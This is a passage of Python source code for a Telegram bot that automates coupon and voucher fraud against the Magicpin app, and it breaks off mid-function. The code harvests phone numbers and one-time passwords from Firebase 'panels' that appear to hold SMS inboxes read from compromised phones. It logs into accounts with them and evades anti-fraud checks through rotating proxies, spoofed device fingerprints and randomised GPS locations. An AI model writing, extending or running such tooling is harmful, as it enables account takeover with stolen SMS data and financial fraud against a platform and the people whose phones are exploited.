#!/usr/bin/env python3
"""
Magicpin Telegram Bot  •  Full-fledged
  • Mode 1  →  OTP login → fetch voucher
  • Mode 2  →  Login → Checkout → Payoutapp → UPI → Voucher
  • Firebase panel  →  auto phone + auto OTP (FinFin Engine ported)
  • Proxy pool     →  unique proxy per parallel worker (Auto-blacklist on rate-limit)
  • Persistent used numbers tracking via used_numbers.txt
  • Parallel runs  →  N concurrent processes

All interaction via Telegram (commands + inline buttons).
Terminal is LOG-ONLY.
"""

import json
import re
import time
import hashlib
import secrets
import uuid
import random
import base64
import urllib.parse
import requests
import urllib3
import os
import threading
import io
import logging
import asyncio
from collections import defaultdict, Counter
from typing import Optional, Dict, List, Tuple, Set, Any
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardRemove,
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# ─────────────────────── TELEGRAM CONFIG ───────────────────────
# Set these as environment variables in Railway (or any host):
#   TG_TOKEN        → your Telegram bot token
#   ALLOWED_CHAT_IDS → comma-separated chat IDs, e.g. "123456,789012"
#   FIRST_NAME      → name used in Magicpin checkout (default: sunil)
#   EMAIL           → email used in Magicpin checkout
TG_TOKEN = os.environ.get("TG_TOKEN", "")

def _parse_allowed_ids() -> list:
    raw = os.environ.get("ALLOWED_CHAT_IDS", "")
    ids = []
    for part in raw.split(","):
        part = part.strip()
        if part:
            try:
                ids.append(int(part))
            except ValueError:
                pass
    return ids

ALLOWED_CHAT_IDS: list = _parse_allowed_ids()
# For backward-compat: single ALLOWED_CHAT keeps pointing to first ID (used in _safe_sync_send)
ALLOWED_CHAT = ALLOWED_CHAT_IDS[0] if ALLOWED_CHAT_IDS else 0
# ───────────────────────────────────────────────────────────────

# ─────────────────────── HARD-CODED USER ───────────────────────
FIRST_NAME = os.environ.get("FIRST_NAME", "sunil")
EMAIL      = os.environ.get("EMAIL", "")
# ───────────────────────────────────────────────────────────────

PKG        = "com.magicpin.local"
VER        = 1220
VERNAME    = "1.120.2"
LAT, LON   = "28.6139390055", "77.20902224216667"
_BASE_LAT  = 28.6139390055
_BASE_LON  = 77.20902224216667

def _jitter_location() -> tuple:
    """Return (lat_str, lon_str) with ±0.007° offset (~780m) from base Delhi coords."""
    lat = _BASE_LAT + random.uniform(-0.007, 0.007)
    lon = _BASE_LON + random.uniform(-0.007, 0.007)
    return f"{lat:.13f}", f"{lon:.13f}"
VOUCHER_ID = "1907919"
MERCHANT   = "26759740"
COUPON     = "SHOP101GP1"
UPI_LIST   = "paytm,phonepe,gpay,mobikwik,amazonpay,navi"
OTP_WAIT_SECONDS = 30

DEVICE_PROFILES = [
    {"name": "Samsung Galaxy A14", "manufacturer": "Samsung", "model": "SM-A145F"},
    {"name": "Samsung Galaxy A15", "manufacturer": "Samsung", "model": "SM-A155F"},
    {"name": "Redmi Note 12", "manufacturer": "Xiaomi", "model": "23021RAAEG"},
    {"name": "Realme C53", "manufacturer": "realme", "model": "RMX3760"},
    {"name": "Vivo Y16", "manufacturer": "vivo", "model": "V2204"},
]

PAY_INITIATE = "https://pg.magicpin.com/pg/payment/initiate"
LEDGER_URL   = "https://webapi.magicpin.in/transactions/ledger/history"

_ANDROID_UA_POOL = [
    # Samsung Galaxy A14
    "Mozilla/5.0 (Linux; Android 13; SM-A145F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    # Samsung Galaxy A15
    "Mozilla/5.0 (Linux; Android 14; SM-A155F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.53 Mobile Safari/537.36",
    # Samsung Galaxy M14
    "Mozilla/5.0 (Linux; Android 13; SM-M146B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.172 Mobile Safari/537.36",
    # Redmi Note 12
    "Mozilla/5.0 (Linux; Android 13; 23021RAAEG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    # Redmi 12C
    "Mozilla/5.0 (Linux; Android 12; 22120RN86G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.118 Mobile Safari/537.36",
    # Realme C53
    "Mozilla/5.0 (Linux; Android 13; RMX3760) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    # Realme Narzo N53
    "Mozilla/5.0 (Linux; Android 13; RMX3761) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.172 Mobile Safari/537.36",
    # Vivo Y16
    "Mozilla/5.0 (Linux; Android 12; V2204) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.118 Mobile Safari/537.36",
    # Poco M5
    "Mozilla/5.0 (Linux; Android 12; 22071219CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.118 Mobile Safari/537.36",
]

def _pick_pg_ua() -> str:
    return random.choice(_ANDROID_UA_POOL)

PG_UA = _pick_pg_ua()
P_UA  = PG_UA

# ── Conversation states ──
(
    MAIN_MENU,
    ADDING_PROXY,
    SETTING_FIREBASE,
    SETTING_WORKERS,
    CHOOSING_MODE,
    WAITING_TARGET,
    WAITING_PHONE_MANUAL,
    WAITING_OTP_MANUAL,
    WAITING_UPI,
    WAITING_DONE,
    WAITING_BATCH_PAID,
) = range(11)

RUNTIME: Dict[str, Any] = {
    "proxies": [],
    "firebase_urls": [],
    "instrument": "Phonepe",
    "workers": 3,
}

BATCH: Dict[str, Any] = {
    "active": False,
    "mode": 2,
    "target": 0,
    "completed": 0,
    "results": {},
    "paid": set(),
    "chat_id": None,
    "bg_task": None,
    "stop": False,
    "used_phones": set(),
    "panel_index": 0,
}
_BATCH_LOCK = __import__("threading").Lock()

def _batch_increment_completed(sid: str = None) -> int:
    """
    Atomically increment BATCH['completed'] and return the new value.
    If sid is provided, only increments once per session ID — prevents
    double-counting when both paid_callback and pending poller fire
    for the same voucher.
    Returns the new count, or current count if already counted for this sid.
    """
    with _BATCH_LOCK:
        if sid:
            counted = BATCH.setdefault("_voucher_counted", set())
            if sid in counted:
                return BATCH.get("completed", 0)  # already counted
            counted.add(sid)
        BATCH["completed"] = BATCH.get("completed", 0) + 1
        return BATCH["completed"]

_BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_PATH = os.path.join(_BASE_DIR, "bot_config.json")
SESSIONS_PATH = os.path.join(_BASE_DIR, "sessions.json")
USED_NUMBERS_PATH = os.path.join(_BASE_DIR, "used_numbers.txt")
MAX_SESSIONS = 300

_file_lock = threading.Lock()
_used_lock = threading.Lock()

logging.basicConfig(
    format="%(asctime)s | %(levelname)-7s | %(message)s",
    level=logging.INFO,
    datefmt="%H:%M:%S",
)
log = logging.getLogger("magicpin")


# ─────────────────────────────────────────────────────────────────
#  SINGLETON FIREBASE SESSION  — FIX for "Connection pool is full"
#  One shared requests.Session with pool sized to worker count + headroom.
#  All Firebase reads go through this instead of spawning raw sessions.
# ─────────────────────────────────────────────────────────────────

class _SharedFirebaseSession:
    _instance: Optional["_SharedFirebaseSession"] = None
    _init_lock = threading.Lock()

    def __new__(cls):
        with cls._init_lock:
            if cls._instance is None:
                obj = super().__new__(cls)
                obj._session = None
                obj._pool_size = 0
                obj._semaphore: Optional[threading.Semaphore] = None
                cls._instance = obj
        return cls._instance

    def _rebuild(self, pool_size: int) -> None:
        retry = Retry(
            total=3,
            backoff_factor=0.4,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["GET", "POST", "PATCH", "PUT", "DELETE"],
            raise_on_status=False,
        )
        adapter = HTTPAdapter(
            pool_connections=pool_size,
            pool_maxsize=pool_size,
            max_retries=retry,
        )
        s = requests.Session()
        s.verify = False
        s.mount("https://", adapter)
        s.mount("http://", adapter)
        self._session = s
        self._pool_size = pool_size
        self._semaphore = threading.Semaphore(max(1, pool_size - 2))
        log.info(f"SharedFirebaseSession rebuilt — pool_size={pool_size}")

    def ensure(self) -> None:
        needed = max(12, RUNTIME.get("workers", 3) + 4)
        if self._session is None or needed > self._pool_size:
            with self._init_lock:
                if self._session is None or needed > self._pool_size:
                    self._rebuild(needed)

    @property
    def session(self) -> requests.Session:
        self.ensure()
        return self._session  # type: ignore

    @property
    def semaphore(self) -> threading.Semaphore:
        self.ensure()
        return self._semaphore  # type: ignore

    def get(self, url: str, **kwargs) -> requests.Response:
        kwargs.setdefault("timeout", 10)
        kwargs.setdefault("verify", False)
        with self.semaphore:
            return self.session.get(url, **kwargs)

    def post(self, url: str, **kwargs) -> requests.Response:
        kwargs.setdefault("timeout", 10)
        kwargs.setdefault("verify", False)
        with self.semaphore:
            return self.session.post(url, **kwargs)


_FB = _SharedFirebaseSession()

# ─────────────────────────────────────────────────────────────────
# Thread-safe Telegram send — used by worker threads that can't
# await async methods. Fires directly via the Bot HTTP API.
# ─────────────────────────────────────────────────────────────────
def _safe_sync_send(chat_id, text: str, parse_mode: str = "HTML") -> None:
    """Send a Telegram message synchronously from any thread."""
    try:
        if not chat_id:
            chat_id = ALLOWED_CHAT
        requests.post(
            f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
            json={"chat_id": chat_id, "text": text, "parse_mode": parse_mode},
            timeout=10,
        )
    except Exception as e:
        log.warning(f"_safe_sync_send failed: {e}")
# ─────────────────────────────────────────────────────────────────


def load_used_numbers() -> Set[str]:
    if not os.path.isfile(USED_NUMBERS_PATH):
        return set()
    res = set()
    try:
        with open(USED_NUMBERS_PATH, "r", encoding="utf-8") as f:
            for line in f:
                p = line.strip()
                if p:
                    res.add(p)
    except Exception as e:
        log.warning(f"load_used_numbers: {e}")
    return res


def mark_used_persistent(phone: str):
    """
    Write phone to used_numbers.txt only if not already present.
    Deduplicates on every write — no more repeated entries.
    Only call this when the number is truly done:
      - OTP never arrived after all attempts (number unreachable)
      - Login succeeded AND payout was reached (success or coupon-failed-with-ledger)
      - UPI QR was successfully delivered (payout complete)
    Do NOT call during re-login retries — the number isn't done yet.
    """
    with _file_lock:
        try:
            existing = load_used_numbers()
            if phone in existing:
                return  # already marked — skip
            with open(USED_NUMBERS_PATH, "a", encoding="utf-8") as f:
                f.write(f"{phone}\n")
                f.flush()
        except Exception as e:
            log.warning(f"mark_used_persistent: {e}")


def load_sessions() -> List[dict]:
    if not os.path.isfile(SESSIONS_PATH):
        return []
    try:
        with open(SESSIONS_PATH, "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, list):
            return data
        return list(data.get("sessions") or [])
    except Exception as e:
        log.warning(f"load_sessions: {e}")
        return []


def save_sessions(sessions: List[dict]):
    try:
        with open(SESSIONS_PATH, "w", encoding="utf-8") as f:
            json.dump(sessions[:MAX_SESSIONS], f, indent=2)
    except Exception as e:
        log.warning(f"save_sessions: {e}")


def save_session_from_result(r: dict) -> str:
    sid = secrets.token_hex(4)
    entry = {
        "id": sid,
        "phone": r.get("phone"),
        "token": r.get("token"),
        "uid": r.get("uid"),
        "txn": r.get("txn"),
        "base_txn_id": r.get("base_txn_id", 0),
        "cards_before": list(r.get("cards_before") or []),
        "proxy": r.get("proxy"),
        "instrument": r.get("instrument"),
        "pg_amt": r.get("pg_amt"),
        "upi_uri": r.get("upi_uri"),
        "worker": r.get("worker"),
        "device_id": r.get("device_id"),
        "firebase_url": r.get("firebase_url"),
        "numeric": r.get("numeric"),   # persisted so pending poller survives bot restart
        "created_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        "status": "awaiting_payment",
        "voucher": None,
    }
    sessions = load_sessions()
    sessions.insert(0, entry)
    save_sessions(sessions)
    return sid


def update_session(sid: str, **fields) -> Optional[dict]:
    sessions = load_sessions()
    for s in sessions:
        if s.get("id") == sid:
            s.update(fields)
            save_sessions(sessions)
            return s
    return None


def get_session(sid: str) -> Optional[dict]:
    for s in load_sessions():
        if s.get("id") == sid:
            return s
    return None


def delete_session(sid: str) -> bool:
    sessions = load_sessions()
    new = [s for s in sessions if s.get("id") != sid]
    if len(new) == len(sessions):
        return False
    save_sessions(new)
    return True


def load_config():
    if not os.path.isfile(CONFIG_PATH):
        return
    try:
        with open(CONFIG_PATH, "r", encoding="utf-8") as f:
            data = json.load(f)
        RUNTIME["proxies"] = list(data.get("proxies") or [])
        RUNTIME["firebase_urls"] = list(data.get("firebase_urls") or [])
        if data.get("workers"):
            RUNTIME["workers"] = int(data["workers"])
        _FB.ensure()  # FIX: resize pool to match loaded worker count
    except Exception as e:
        log.warning(f"load_config: {e}")


def save_config():
    try:
        data = {
            "proxies": RUNTIME["proxies"],
            "firebase_urls": RUNTIME["firebase_urls"],
            "instrument": RUNTIME.get("instrument", "Phonepe"),
            "workers": RUNTIME.get("workers", 3),
        }
        with open(CONFIG_PATH, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        log.warning(f"save_config: {e}")


SMS_SUBPATHS = [
    "messages", "sms", "inbox", "Sms", "SMS", "callLogs",
    "calls", "notifications", "receivedSms", "smsList",
]

PHONE_PATTERNS_WEIGHTED = [
    (re.compile(r'(?:phone|mobile|number|mob|no)[\s:]*(?:\+?91[\s-]?)?([6-9]\d{9})', re.I), 15),
    (re.compile(r'\b(?:\+91|91)?([6-9]\d{9})\b'), 10),
    (re.compile(r'[^0-9]([6-9]\d{9})[^0-9]'), 5),
]

ONLINE_STATUS_FIELDS = ("status", "online", "isOnline", "connected", "active")
ONLINE_TRUE_VALUES   = {"true", "1", "online", "connected", "active", "yes"}


def parse_panel_link(link: str) -> Optional[str]:
    if not link:
        return None
    link = link.strip()
    if link.startswith("https://") and ("firebaseio.com" in link or "firebasedatabase.app" in link):
        if not link.endswith("/"):
            link += "/"
        return link
    return None


def _is_online(dev):
    for field in ONLINE_STATUS_FIELDS:
        raw = dev.get(field)
        if raw is None:
            continue
        if isinstance(raw, bool):
            return raw
        if isinstance(raw, int):
            return raw == 1
        if str(raw).lower().strip() in ONLINE_TRUE_VALUES:
            return True
    return False


def _clean_phone(raw):
    if not raw:
        return None
    digits = re.sub(r"\D", "", str(raw))
    if digits.startswith("91") and len(digits) == 12:
        digits = digits[2:]
    if digits.startswith("0") and len(digits) == 11:
        digits = digits[1:]
    if len(digits) == 10 and digits[0] in "6789":
        return digits
    return None


def _phone_from_device_fields(dev):
    sims = dev.get("sims", [])
    if isinstance(sims, dict):
        sims = list(sims.values())
    if isinstance(sims, list):
        for sim in sims[:2]:
            if isinstance(sim, dict):
                for k in ("phoneNumber", "phone", "number", "mobNo", "mob"):
                    p = _clean_phone(sim.get(k))
                    if p:
                        return p

    for k in ("mobNo", "mob", "phoneNumber", "phone", "number", "mobile"):
        p = _clean_phone(dev.get(k))
        if p:
            return p
    return None


def _phone_from_messages(msgs):
    counts = Counter()
    items = msgs.values() if isinstance(msgs, dict) else (msgs if isinstance(msgs, list) else [])
    for msg in items:
        if not isinstance(msg, dict):
            continue
        text = str(msg.get("body") or msg.get("message") or msg.get("text") or msg.get("content") or "")
        for pat, score in PHONE_PATTERNS_WEIGHTED:
            for num in pat.findall(text):
                digits = re.sub(r"\D", "", num)
                if digits.startswith("91") and len(digits) == 12:
                    digits = digits[2:]
                if len(digits) == 10 and digits[0] in "6789":
                    counts[digits] += score
    return counts.most_common(1)[0][0] if counts else None


def _fetch_phone_from_firebase(firebase_url, cid):
    # FIX: uses singleton _FB instead of a passed-in raw session
    try:
        r = _FB.get(f"{firebase_url}messages/{cid}.json", timeout=8)
        if r.status_code == 200:
            data = r.json()
            if isinstance(data, dict) and data:
                return _phone_from_messages(data)
    except Exception:
        pass
    return None


def _load_firebase_root(firebase_url):
    # FIX: uses singleton _FB instead of spawning a raw session
    ROOT_KEYS = ["clients", "devices", "users", "Clients", "Devices", "client", "device", "phones", "mobiles"]

    for key in ROOT_KEYS:
        try:
            r = _FB.get(f"{firebase_url}{key}.json", timeout=12)
            if r.status_code != 200:
                continue
            data = r.json()
            if isinstance(data, dict) and len(data) > 0:
                return key, data
        except Exception:
            continue

    try:
        r = _FB.get(f"{firebase_url}.json?shallow=true", timeout=12)
        root_keys = r.json()
        if isinstance(root_keys, dict):
            for key in list(root_keys.keys()):
                try:
                    r2 = _FB.get(f"{firebase_url}{key}.json", timeout=12)
                    data = r2.json()
                    if isinstance(data, dict) and len(data) > 0:
                        sample = next(iter(data.values()))
                        if isinstance(sample, dict):
                            return key, data
                except Exception:
                    continue
    except Exception:
        pass
    return None, None


def fetch_phones_from_panel(firebase_url: str, limit: int = 100) -> List[Tuple[str, str]]:
    if not firebase_url.endswith("/"):
        firebase_url += "/"
    root_key, raw_data = _load_firebase_root(firebase_url)
    if not raw_data:
        return []

    # Hard filter — ONLY online devices. Never fall back to offline ones.
    # If Firebase has no online status fields at all, returns empty rather
    # than accidentally sending OTP to offline numbers.
    online_devs = {
        cid: dev for cid, dev in raw_data.items()
        if isinstance(dev, dict) and _is_online(dev)
    }
    if not online_devs:
        log.info(f"fetch_phones_from_panel: no online devices found in {firebase_url}")
        return []
    pool = online_devs

    # FIX: removed raw session — _fetch_phone_from_firebase now uses _FB singleton
    result = []
    seen_phones = set()
    lock = threading.Lock()

    def process_device(cid, dev):
        phone = _phone_from_device_fields(dev)
        if not phone:
            phone = _fetch_phone_from_firebase(firebase_url, cid)
        if not phone:
            return
        with lock:
            if phone in seen_phones:
                return
            seen_phones.add(phone)
            result.append((phone, cid))

    with ThreadPoolExecutor(max_workers=50) as ex:
        futures = [ex.submit(process_device, cid, dev) for cid, dev in list(pool.items())[:limit * 2]]
        for fut in as_completed(futures):
            try:
                fut.result()
            except Exception:
                pass
            if len(result) >= limit:
                break
    return result


def fetch_phones_from_panels(
    firebase_urls: List[str],
    limit: int = 100,
    start_panel: int = 0,
    exclude_phones: Optional[Set[str]] = None,
) -> Tuple[List[Tuple[str, str, str]], int]:
    result: List[Tuple[str, str, str]] = []
    persistent_used = load_used_numbers()
    exclude = set(exclude_phones or set()).union(persistent_used)
    seen_local: Set[str] = set()
    n = len(firebase_urls)
    if n == 0:
        return [], 0

    panel_idx = max(0, min(start_panel, n - 1))
    while panel_idx < n and len(result) < limit:
        url = firebase_urls[panel_idx]
        need = limit - len(result)
        batch = fetch_phones_from_panel(url, limit=max(need * 3, 20))
        added = 0
        for phone, device_id in batch:
            if phone in exclude or phone in seen_local:
                continue
            seen_local.add(phone)
            result.append((phone, device_id, url))
            added += 1
            if len(result) >= limit:
                break
        if added == 0:
            panel_idx += 1
        else:
            if len(result) >= limit:
                break
            panel_idx += 1

    return result, min(panel_idx, n)


def get_last_msg_key(firebase_url, device_id):
    # FIX: uses singleton _FB instead of spawning a raw session
    latest = None
    active_subpath = None
    for subpath in SMS_SUBPATHS:
        try:
            r = _FB.get(f'{firebase_url}{subpath}/{device_id}.json?orderBy="$key"&limitToLast=1', timeout=4)
            if r.status_code != 200:
                continue
            data = r.json()
            if isinstance(data, dict) and data:
                key = sorted(data.keys())[-1]
                if latest is None or key > latest:
                    latest = key
                    active_subpath = subpath
        except Exception:
            continue
    return latest, active_subpath


def _extract_otp_from_body(body):
    candidates = re.findall(r"\b(\d{4,6})\b", body)
    if not candidates:
        return None
    scores = defaultdict(int)
    body_lower = body.lower()
    for c in candidates:
        n = int(c)
        if 1900 <= n <= 2099:
            continue
        scores[c] += 1
        for kw in ("otp", "code", "verify", "verification", "pin", "one time", "passcode", "password", "secret"):
            if kw in body_lower:
                scores[c] += 5
                break
        if len(c) == 6:
            scores[c] += 3
        if re.search(rf"[₹Rs\.]\s*{re.escape(c)}", body):
            scores[c] -= 10
    if not scores:
        return None
    return max(scores, key=scores.__getitem__)


def poll_otp_from_panel(
    firebase_url: str,
    device_id: str,
    timeout: int = OTP_WAIT_SECONDS,
    keywords: Optional[List[str]] = None,
) -> Optional[str]:
    last_key, active_subpath = get_last_msg_key(firebase_url, device_id)
    if not firebase_url.endswith("/"):
        firebase_url += "/"
    deadline = time.time() + timeout
    # FIX: removed raw fb_session — now uses _FB singleton
    poll_paths = [active_subpath] + [s for s in SMS_SUBPATHS if s != active_subpath] if active_subpath else SMS_SUBPATHS

    while time.time() < deadline:
        for subpath in poll_paths:
            try:
                r = _FB.get(f'{firebase_url}{subpath}/{device_id}.json?orderBy="$key"&limitToLast=20', timeout=4)
                if r.status_code != 200:
                    continue
                msgs = r.json()
                if not isinstance(msgs, dict):
                    continue
                for key in sorted(msgs.keys(), reverse=True):
                    if last_key and key <= last_key:
                        break
                    msg = msgs[key]
                    body = ""
                    if isinstance(msg, dict):
                        body = str(msg.get("body") or msg.get("message") or msg.get("text") or msg.get("content") or " ".join(str(v) for v in msg.values() if isinstance(v, str)))
                    elif isinstance(msg, str):
                        body = msg
                    if not body:
                        continue
                    otp = _extract_otp_from_body(body)
                    if otp:
                        return otp
            except Exception:
                continue
        time.sleep(1)
    return None


def normalize_proxy(raw: str) -> Optional[str]:
    raw = (raw or "").strip()
    if not raw:
        return None
    if "://" in raw and "@" in raw:
        return raw
    scheme = "http"
    rest = raw
    m = re.match(r"^(https?|socks5?|socks4)://(.+)$", raw, re.I)
    if m:
        scheme = m.group(1).lower()
        rest = m.group(2)
    if "@" in rest:
        return f"{scheme}://{rest}"
    parts = rest.split(":")
    if len(parts) == 2:
        return f"{scheme}://{rest}"
    if len(parts) >= 4:
        host, port = parts[0], parts[1]
        user = parts[2]
        password = ":".join(parts[3:])
        user_enc = urllib.parse.quote(user, safe="")
        pass_enc = urllib.parse.quote(password, safe="")
        return f"{scheme}://{user_enc}:{pass_enc}@{host}:{port}"
    if len(parts) == 3 and parts[1].isdigit():
        return f"{scheme}://{parts[0]}:{parts[1]}"
    return f"{scheme}://{rest}"


def parse_proxy_list(text: str) -> List[str]:
    parts = re.split(r"[\n,;]+", text.strip())
    out = []
    for p in parts:
        p = p.strip()
        if not p:
            continue
        n = normalize_proxy(p)
        if n:
            out.append(n)
    return out


def proxy_dict(proxy: Optional[str]) -> Optional[dict]:
    if not proxy:
        return None
    return {"http": proxy, "https": proxy}


class ProxyPool:
    """
    Proxy pool with three tiers of exclusion:

    1. _bad        — temporary cooldown (rate-limit / OTP fail). Auto-expires.
    2. _burned     — PERMANENT for this run. Set when a proxy successfully
                     reaches payout. MagicPin fingerprints IPs per session;
                     reusing a payout IP on a new account silently kills the
                     coupon. These are never auto-cleared — only a manual
                     full_reset() or fresh bot restart clears them.
    3. _locked     — in-use right now by one worker. Prevents two workers
                     grabbing the same proxy simultaneously during login.
                     Released automatically after login completes (success or fail).

    Call order for a worker:
        proxy = PROXY_POOL.acquire()        # lock + return proxy
        ...do OTP + login...
        PROXY_POOL.release(proxy)           # unlock after login done
        ...do checkout / payout...
        PROXY_POOL.mark_payout_burned(proxy)  # payout reached — retire proxy
    """
    def __init__(self):
        import threading
        self._lock     = threading.Lock()
        self._bad:     Dict[str, float] = {}   # proxy → expiry timestamp
        self._burned:  set              = set() # permanent payout-burned proxies
        self._locked:  set              = set() # currently in-use by a worker
        self._cooldown = 300

    # ── availability ──────────────────────────────────────────────────────────

    def all_good(self) -> List[str]:
        """Proxies not blacklisted, not burned, not currently locked."""
        now = time.time()
        with self._lock:
            return [
                p for p in (RUNTIME.get("proxies") or [])
                if self._bad.get(p, 0) <= now
                and p not in self._burned
                and p not in self._locked
            ]

    def available_count(self) -> int:
        return len(self.all_good())

    def burned_count(self) -> int:
        with self._lock:
            return len(self._burned)

    def blacklisted_count(self) -> int:
        now = time.time()
        with self._lock:
            return sum(1 for ts in self._bad.values() if ts > now)

    def is_pool_exhausted(self) -> bool:
        """
        True when every proxy is either burned or temp-blacklisted
        and there are no proxies available for new work.
        """
        return len(self.all_good()) == 0

    # ── acquire / release (login lock) ────────────────────────────────────────

    def acquire(self, after: Optional[str] = None) -> Optional[str]:
        """
        Atomically select AND lock a proxy in one mutex operation.
        Without holding the lock during selection, two workers running
        all_good() simultaneously would both see the same proxy as free
        and both lock it — defeating the whole point.
        Returns None if pool is exhausted.
        """
        now = time.time()
        with self._lock:
            good = [
                p for p in (RUNTIME.get("proxies") or [])
                if self._bad.get(p, 0) <= now
                and p not in self._burned
                and p not in self._locked
            ]
            if not good:
                return None

            if after and after in good:
                idx = good.index(after)
                proxy = good[(idx + 1) % len(good)]
            else:
                proxy = random.choice(good)

            self._locked.add(proxy)  # lock happens inside the same mutex

        log.info(f"🔒 Proxy acquired (locked): {proxy[:50]}")
        return proxy

    def release(self, proxy: Optional[str]) -> None:
        """Release the login lock on a proxy after OTP+login is done."""
        if not proxy:
            return
        with self._lock:
            self._locked.discard(proxy)
        log.info(f"🔓 Proxy released (unlocked): {proxy[:50]}")

    # ── payout burn ───────────────────────────────────────────────────────────

    def mark_payout_burned(self, proxy: Optional[str]) -> None:
        """
        Permanently retire a proxy after it successfully reached payout.
        This proxy will NEVER be handed out again for the rest of this run,
        preventing MagicPin from silently killing coupons on shared IPs.
        """
        if not proxy:
            return
        with self._lock:
            self._burned.add(proxy)
            self._locked.discard(proxy)  # also release lock if still held
        log.warning(
            f"🔥 Proxy PAYOUT-BURNED (retired for this run): {proxy[:50]}"
        )

    # ── temp blacklist ────────────────────────────────────────────────────────

    def mark_bad(self, proxy: Optional[str], reason: str = ""):
        if not proxy:
            return
        with self._lock:
            self._bad[proxy] = time.time() + self._cooldown
            self._locked.discard(proxy)
        log.warning(f"🚫 Proxy blacklisted for 300s ({reason}): {proxy[:50]}")

    def flush_bad_for(self, proxies: List[str]) -> int:
        """Remove specific proxy strings from the temp blacklist.
        Call before adding new proxies so fresh ones start clean.
        Does NOT clear burned proxies — those stay burned."""
        removed = 0
        with self._lock:
            for p in proxies:
                if p in self._bad:
                    del self._bad[p]
                    removed += 1
        if removed:
            log.info(f"🔓 Flushed {removed} stale blacklist entries.")
        return removed

    def full_reset(self) -> None:
        """
        Wipe temp blacklist AND burned set AND locks.
        Only call this when loading fresh proxies for a new run.
        """
        with self._lock:
            bl_count = len(self._bad)
            br_count = len(self._burned)
            lk_count = len(self._locked)
            self._bad.clear()
            self._burned.clear()
            self._locked.clear()
        log.info(
            f"🔄 ProxyPool full reset — cleared {bl_count} blacklisted, "
            f"{br_count} burned, {lk_count} locked."
        )

    # ── next_after (legacy compat — does not lock) ────────────────────────────

    def next_after(self, current: Optional[str] = None) -> Optional[str]:
        """
        Legacy rotation used by non-login steps (checkout, payoutapp, etc.).
        Does NOT lock the proxy — only acquire() does that.
        Falls back gracefully if pool is exhausted.
        """
        good = self.all_good()
        if not good:
            # Don't auto-clear burned here — only clear temp bad entries
            log.warning("⚠️  No proxies available (all burned/blacklisted).")
            with self._lock:
                self._bad.clear()
            good = [
                p for p in (RUNTIME.get("proxies") or [])
                if p not in self._burned
            ]
        if not good:
            log.warning("⚠️  All proxies are payout-burned — pool truly exhausted.")
            return None
        if current and current in good:
            idx = good.index(current)
            return good[(idx + 1) % len(good)]
        return random.choice(good)

    def next_unique_set(self, n: int) -> List[Optional[str]]:
        """Return up to n distinct available proxies for parallel workers."""
        good = self.all_good()
        if not good:
            return [None] * n
        random.shuffle(good)
        return [good[i % len(good)] for i in range(n)]


PROXY_POOL = ProxyPool()


def _is_proxy_error(exc: BaseException) -> bool:
    msg = str(exc).lower()
    keys = (
        "proxy", "tunnel", "remote end closed", "connection aborted",
        "connection reset", "timed out", "timeout", "max retries",
        "network is unreachable", "cannot connect", "503", "429",
        "ssl", "broken pipe", "remotedead", "rate limit",
    )
    return any(k in msg for k in keys)


# Per-run salt: regenerated every time the script starts.
# This ensures the same phone number never produces the same
# device_id across runs, breaking server-side fingerprint correlation.
_RUN_SALT = secrets.token_hex(8)

DEVICE_PROFILES_EXTENDED = [
    {"name": "Samsung Galaxy A14",  "manufacturer": "Samsung",  "model": "SM-A145F"},
    {"name": "Samsung Galaxy A15",  "manufacturer": "Samsung",  "model": "SM-A155F"},
    {"name": "Samsung Galaxy M14",  "manufacturer": "Samsung",  "model": "SM-M146B"},
    {"name": "Redmi Note 12",       "manufacturer": "Xiaomi",   "model": "23021RAAEG"},
    {"name": "Redmi 12C",           "manufacturer": "Xiaomi",   "model": "22120RN86G"},
    {"name": "Realme C53",          "manufacturer": "realme",   "model": "RMX3760"},
    {"name": "Realme Narzo N53",    "manufacturer": "realme",   "model": "RMX3761"},
    {"name": "Vivo Y16",            "manufacturer": "vivo",     "model": "V2204"},
    {"name": "Poco M5",             "manufacturer": "POCO",     "model": "22071219CG"},
    {"name": "Infinix Hot 30i",     "manufacturer": "Infinix",  "model": "X669D"},
]


def generate_device(phone: str, fresh: bool = False) -> dict:
    """
    Generate a device profile for the given phone number.

    fresh=True  → uses a per-call random salt (for OTP retry loops — every
                  attempt gets a completely different device fingerprint so
                  the server cannot correlate retries across proxies).
    fresh=False → uses the per-run salt (stable within one script run,
                  rotates on each restart).

    The old version was seeded purely from the phone number, meaning the same
    device_id was returned on every call for the same phone.  Magicpin's backend
    correlates device_id + phone across OTP requests regardless of IP, so fresh
    proxies were still getting rate-limited because the fingerprint was identical.
    """
    if fresh:
        salt = secrets.token_hex(6)
        seed_str = f"{phone}{salt}"
    else:
        # Stable seed: SHA-256 of phone only — same SIM = same device forever
        seed_str = phone

    seed = int(hashlib.sha256(seed_str.encode()).hexdigest(), 16) % (2 ** 32)
    rng  = random.Random(seed)

    prof = rng.choice(DEVICE_PROFILES_EXTENDED)
    did  = "".join(rng.choice("0123456789abcdef") for _ in range(16))

    # Stable GAID also seeded from phone (fresh=False) or random (fresh=True)
    if fresh:
        gaid = str(uuid.UUID(int=random.Random().getrandbits(128), version=4))
    else:
